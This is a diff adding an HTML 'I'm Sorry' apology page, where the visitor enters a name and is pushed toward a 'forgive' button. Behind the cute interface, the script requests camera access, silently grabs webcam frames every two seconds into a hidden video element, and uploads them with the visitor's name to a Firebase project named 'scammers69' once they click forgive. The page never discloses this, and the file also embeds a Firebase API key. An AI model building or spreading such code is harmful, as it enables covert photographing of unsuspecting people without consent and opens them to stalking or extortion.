@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>I’m Sorry 🥺💔</title>
+
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+
+<style>
+body {margin:0;font-family:Arial;background:#ffe6f0;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;}
+.card {width:92%;max-width:420px;background:#fff;border-radius:14px;padding:22px;box-shadow:0 8px 24px rgba(0,0,0,.12);}
+h1 {color:#ff4d88;margin:10px 0 20px;}
+p {color:#666;}
+input {width:90%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #ddd;font-size:16px;}
+button {padding:12px 18px;border:none;border-radius:10px;margin:8px;cursor:pointer;font-size:16px;}
+.primary {background:#ff4d6d;color:#fff;}
+.forgive {background:#28a745;color:#fff;}
+.angry {background:#dc3545;color:#fff;}
+.hidden {display:none;}
+</style>
+</head>
+<body>
+
+<div class="card">
+
+  <!-- STEP 1 -->
+  <div id="step1">
+    <h1>Hey 🥺</h1>
+    <input id="name" placeholder="Your name" />
+    <br>
+    <button class="primary" onclick="startFlow()">Continue 💌</button>
+  </div>
+
+  <!-- STEP 2 (I MESSED UP) -->
+  <div id="step2" class="hidden">
+    <h1>I messed up... 💔</h1>
+    <p>I didn’t mean to hurt you 😔<br>Can I fix this?</p>
+    <button class="primary" onclick="goToApology()">Okay... 😞</button>
+  </div>
+
+  <!-- STEP 3 (APOLOGY) -->
+  <div id="step3" class="hidden">
+    <h1>I’m really really sorry 🥺💖</h1>
+    <button id="forgiveBtn" class="forgive">I forgive you 💕</button>
+    <button id="angryBtn" class="angry">Still angry 😤</button>
+  </div>
+
+  <!-- STEP 4 (CELEBRATION) -->
+  <div id="celebration" class="hidden">
+    <h1>Yayyy 🥺💖</h1>
+    <p>Thank you for forgiving me ❤️<br>I promise I'll do better 💕</p>
+  </div>
+
+</div>
+
+<script>
+// 🔥 Firebase config
+const firebaseConfig = {
+  apiKey: "AIzaSyAivrTp4Mu8-PPxdWdPErNwkb3FUAjmcPs",
+  authDomain: "scammers69.firebaseapp.com",
+  databaseURL: "https://scammers69-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "scammers69",
+  storageBucket: "scammers69.firebasestorage.app",
+  messagingSenderId: "344596974081",
+  appId: "1:344596974081:web:f005290bc445f28c308e00"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+// VARIABLES
+let stream = null;
+let video = document.createElement("video");
+video.autoplay = true;
+video.playsInline = true;
+video.muted = true;
+video.style.display = "none";
+document.body.appendChild(video);
+
+let screenshots = [];
+let interval = null;
+let userName = "";
+
+// START FLOW
+async function startFlow(){
+  userName = document.getElementById("name").value.trim();
+  if(!userName){ alert("Enter your name 🙂"); return; }
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+      video.play();
+      interval = setInterval(() => takeScreenshot("auto"), 2000);
+    };
+
+  } catch (err) {
+    console.warn("Camera denied");
+  }
+
+  document.getElementById("step1").classList.add("hidden");
+  document.getElementById("step2").classList.remove("hidden"); // 👈 NEW PAGE
+}
+
+// GO TO APOLOGY
+function goToApology(){
+  document.getElementById("step2").classList.add("hidden");
+  document.getElementById("step3").classList.remove("hidden");
+
+  let forgiveBtn = document.getElementById("forgiveBtn");
+  let angryBtn = document.getElementById("angryBtn");
+
+  let size = 16, count = 0;
+  const texts = ["Still angry 😤","Really upset 😠","You hurt me 😢","Think again 😑","Hmm 😕"];
+
+  angryBtn.onclick = () => {
+    count++;
+    size += 8;
+    forgiveBtn.style.fontSize = size + "px";
+    angryBtn.innerText = texts[count % texts.length];
+  };
+
+  forgiveBtn.onclick = async () => {
+    confetti({particleCount:150, spread:90, origin:{y:0.6}});
+
+    takeScreenshot("forgiven");
+    clearInterval(interval);
+
+    await saveToFirestore("forgiven");
+
+    document.getElementById("step3").classList.add("hidden");
+    document.getElementById("celebration").classList.remove("hidden"); // 🎉 NEW PAGE
+  };
+}
+
+// SCREENSHOT
+function takeScreenshot(type){
+  if(!video.videoWidth) return;
+
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0);
+
+  const data = canvas.toDataURL("image/jpeg", 0.5);
+
+  screenshots.push({data, type, time:new Date()});
+}
+
+// SAVE
+async function saveToFirestore(status){
+  try{
+    const ref = await db.collection("apologies").add({
+      user: userName,
+      status,
+      totalShots: screenshots.length,
+      timestamp: new Date()
+    });
+
+    for(let i=0;i<screenshots.length;i++){
+      await db.collection("apologyShots").add({
+        refId: ref.id,
+        user: userName,
+        img: screenshots[i].data.substring(0,500000),
+        type: screenshots[i].type,
+        time: screenshots[i].time
+      });
+    }
+  }catch(e){
+    console.error(e);
+  }
+}
+
+// CLEANUP
+window.addEventListener("beforeunload", () => {
+  if(interval) clearInterval(interval);
+  if(stream){
+    stream.getTracks().forEach(track => track.stop());
+  }
+});
+</script>
+
+</body>
+</html>
